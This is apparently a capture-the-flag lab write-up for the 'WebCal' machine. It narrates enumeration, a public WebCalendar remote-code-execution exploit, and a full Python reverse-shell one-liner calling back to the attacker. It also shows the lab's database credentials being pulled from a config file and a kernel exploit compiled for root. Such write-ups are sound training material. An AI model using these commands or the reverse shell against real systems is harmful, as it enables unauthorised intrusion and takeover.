---
description: Pg Practice WebCal writeup
---

# WebCal

![](<../../../.gitbook/assets/image (791).png>)

## Nmap

```
sudo nmap 192.168.59.37 -sS -p- -sV 

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Pure-FTPd
22/tcp open  ssh     OpenSSH 5.8p1 Debian 7ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp open  smtp    Postfix smtpd
53/tcp open  domain  ISC BIND 9.7.3
80/tcp open  http    Apache httpd 2.2.20 ((Ubuntu))
Service Info: Host:  ucal.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## FTP

On port 21 we have Pure-FTPd running. I tried anonymous login and was unable to authenticate.

![](<../../../.gitbook/assets/image (771).png>)

## SMTP

I ran default scripts and version enumeration against port 25 and was unable to gain interesting information. I will instead move onto port 80 for the time being.

![](<../../../.gitbook/assets/image (772).png>)

## HTTP

The root page for Port 80 takes us to the following:

![](<../../../.gitbook/assets/image (773).png>)

Before navigating the website I ran `nikto` and `dirsearch.py` for further enumeration.

![Dirsearch](<../../../.gitbook/assets/image (774).png>)

![Nikto](<../../../.gitbook/assets/image (775).png>)

I looked through the discovered directories from `dirsearch.py` and was unable to identify any attack vectors. Looking through the output for `nikto` we do have a directory of /webcalendar/login.php.

![](<../../../.gitbook/assets/image (776).png>)

We arrive at a login page for WebCalendar v1.2.3. I looked up default credentials which are admin:admin and was denied a valid login. I researched exploits for WebCalendar and came to a RCE exploit.

{% embed url="https://www.exploit-db.com/exploits/18775" %}

As per the defined usage in the exploit code I ran the exploit.

```
php exploit.php <IP> /webcalendar/
```

![](<../../../.gitbook/assets/image (778).png>)

We now have a shell on the target machine and we are running as the user www-data. I found with this shell that when you trying changing directories or running scripts it would have unexpected behaviour.

I performed a quick check to see if python was installed using `which python`. After confirming Python is installed I tried a quick one liner reverse shell to see if we can get a more stable one.

First I started a `netcat` listener on my attacking machine:

```
sudo nc -lvp 443
```

The run the following command on the target machine:

```
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

We now have a more stable shell.

![](<../../../.gitbook/assets/image (779) (1).png>)

I changed to the /tmp/ directory and set up a `Python SimpleHTTPServer` on my attacking machine and downloaded `linpeas.sh` to assist with privilege escalation.

![](<../../../.gitbook/assets/image (780).png>)

After running `linpeas` I had some trouble identifying a privilege escalation vector and fell into some rabbit holes. I decided to go back some and Google search for other WebCal exploits. I come across the following exploit.

{% embed url="https://www.exploit-db.com/exploits/40057" %}

Except I was not actually interested in the exploit but in code we see a mention of database credentials.

![](<../../../.gitbook/assets/image (781).png>)

I then looked for the settings.php file on the target machine which was on the /includes/ directory. Here I was able to find some database credentials.

![](<../../../.gitbook/assets/image (782).png>)

We have the credentials: `wc:edjfbxMT7KKo2PPC`

I was then enable to login to MySQL with the credentials we have gathered.

```
mysql -u wc -p 
```

I was then able to pull the WebCal admin username and password hash from the intranet database.

![](<../../../.gitbook/assets/image (783) (1).png>)

I ID'd the hash as being a MD5 hash. At this point I tried cracking with `hashcat` on multiple wordlists including rockyou.txt and was unable to crack.

After searching around for privilege escalation vectors I was absolutely stuck for an exploit. I then checked [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester).

![](<../../../.gitbook/assets/image (784) (1).png>)

The script directs to the memodipper exploit being a highly probable chance of exploitation. Download the exploit code and transfer it over to the target machine so we can compile.

{% embed url="https://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c" %}

I compiled the exploit with `gcc` and allowed the binary to be executable with `chmod`. Once completed I then called the exploit and was given a root shell.

```
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

![](<../../../.gitbook/assets/image (786).png>)
